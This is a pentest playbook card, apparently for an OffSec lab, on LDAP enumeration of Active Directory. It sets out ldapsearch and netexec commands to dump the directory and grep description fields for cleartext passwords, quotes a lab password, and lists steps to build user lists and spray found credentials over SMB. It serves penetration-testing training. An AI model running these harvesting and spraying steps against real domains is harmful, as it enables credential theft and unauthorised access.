title: LDAP Enumeration → Users, Creds in Attributes
body: Pull the directory over LDAP (389). Often anonymous-bind works with zero creds. The big win: user attributes - especially description - frequently hold CLEARTEXT passwords. Query by IP to dodge DNS, get the base DN right, and grep everything.
cmd:
# ════════════════════════════════════════════════════════
# LDAP ENUM - the directory will often just hand you a password
# ════════════════════════════════════════════════════════

# -- STEP 1: Query by IP (skip DNS headaches) ----------------
# Base DN = the domain split into dc= parts:  hutch.offsec -> dc=hutch,dc=offsec
# Anonymous bind first (no creds needed on many DCs):
ldapsearch -x -H ldap://$ip -b "dc=DOMAIN,dc=TLD" "(objectClass=person)"
# Connection refused / 'Can't contact LDAP server (-1)' = usually a NAME
# problem (wrong host / extra .com) - use the IP, not the hostname.

# -- STEP 2: If anon bind is blocked, authenticate -----------
# (You're assumed-breach - use the cred you have.)
# NOTE: simple bind (-x) wants UPN (user@dom.tld) or full DN, not DOMAIN\\user.
ldapsearch -x -H ldap://$ip -D "user@DOMAIN.TLD" -w 'pass' -b "dc=DOMAIN,dc=TLD" "(objectClass=person)"
# netexec is faster for structured pulls:
nxc ldap $ip -u user -p 'pass' --users
nxc ldap $ip -u '' -p '' --users        # try null/anon too

# -- STEP 3: GREP FOR CLEARTEXT CREDS (the actual win) -------
# Dump everything to a file, then mine it:
ldapsearch -x -H ldap://$ip -b "dc=DOMAIN,dc=TLD" > ldap_all.txt
grep -i -E 'description|info|comment|password|pwd' ldap_all.txt
# Admins stash creds in 'description' constantly. Worked example (Hutch):
#   description: Password set to CrabSharkJellyfish192 at user's request.
# That one line was the entire foothold.

# -- STEP 4: Build a users list (for spray / roast) ----------
ldapsearch -x -H ldap://$ip -b "dc=DOMAIN,dc=TLD" "(objectClass=person)" sAMAccountName | awk '/^sAMAccountName:/{print $2}' > users.txt
wc -l users.txt

# -- STEP 5: Decode userAccountControl flags -----------------
# In the dump, UAC tells you account state:
#   512   = normal enabled account
#   514   = DISABLED
#   66048 = enabled + PASSWORD_NEVER_EXPIRES  (a found pw is likely STILL valid)
#   66082 = disabled + pw-never-expires (e.g. Guest)
#   4260352 = no-preauth set -> AS-REP roastable

# -- STEP 6: VERIFY any found credential ---------------------
nxc smb $ip -u FOUND_USER -p 'FOUND_PASS'
# [+] = live cred. Then SPRAY it across users.txt and move into AD attacks.
nxc smb $ip -u users.txt -p 'FOUND_PASS' --continue-on-success
warn: Query by IP, not hostname - 'Can't contact LDAP server (-1)' is almost always a name/DNS issue (a stale /etc/hosts or an extra .com), not LDAP itself. Base DN is the domain as dc= parts (hutch.offsec = dc=hutch,dc=offsec), NOT the dc=example,dc=com placeholder. Always grep the dump for 'description'/'info' - cleartext passwords live there. UAC 66048 = password-never-expires, so a found cred is probably still valid despite any 'change on next login' note.

choices.label: Found a cleartext cred → where does it work?
Got users + a cred → run BloodHound
